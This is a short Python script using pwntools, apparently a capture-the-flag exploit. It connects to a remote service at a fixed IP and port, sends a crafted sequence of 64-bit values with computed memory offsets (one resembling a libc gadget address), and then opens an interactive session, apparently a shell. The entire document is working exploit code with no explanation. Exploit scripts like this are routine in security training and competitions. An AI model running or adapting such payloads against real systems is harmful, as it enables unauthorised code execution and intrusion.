from pwn import *

MAX = 0x10000000000000000

p = remote("182.92.73.10", "36642")

payload = ""
payload += p64(1) + p64(MAX + 0xF02A4 - 0x5D1000 - 0x1A000)
payload += p64(6) + p64(MAX - 1)
payload += p64(25)
payload += p64(6) + p64(MAX - 0x3FED + (0x1A000 / 8))
payload += p64(13)
payload += p64(6) + p64(0x100)
payload += p64(0x1E)

p.send(payload)
p.interactive()
